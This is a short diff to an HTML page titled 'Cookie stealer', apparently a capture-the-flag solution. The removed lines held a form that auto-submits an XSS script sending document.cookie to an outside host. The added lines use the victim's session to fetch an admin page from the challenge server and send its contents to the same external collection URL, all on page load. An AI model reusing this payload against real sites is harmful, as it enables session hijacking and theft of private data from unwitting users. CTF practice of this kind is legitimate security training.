@@ -4,11 +4,16 @@
     <title>Cookie stealer</title>
   </head>
   <body>
-    <form name=TheForm action=http://challenges.laptophackingcoffee.org:1337/dev.php method=post>
-      <input type=hidden name=message value="&lt;script&gt;var res = &quot;https://lopolis-api.now.sh/?cokiz=&quot; + encodeURI(document.cookie); var xmlHttp = new XMLHttpRequest(); xmlHttp.open(&quot;GET&quot;, res, false); xmlHttp.send(null);&lt;/script&gt;">
-    </form>
     <script>
-      document.TheForm.submit();
+      var xmlHttp = new XMLHttpRequest();
+      xmlHttp.open( "GET", "http://challenges.laptophackingcoffee.org:1337/dev.php?page=admin", false ); // false for synchronous request
+      xmlHttp.send( null );
+      var resp = xmlHttp.responseText;
+      var xmlHttp = new XMLHttpRequest();
+      var theurl = "https://lopolis-api.now.sh/?cookiz=" + encodeURI(resp);
+      xmlHttp.open( "GET", theurl, false ); // false for synchronous request
+      xmlHttp.send( null );
+      var resp = xmlHttp.responseText;
     </script>
   </body>
 </html>
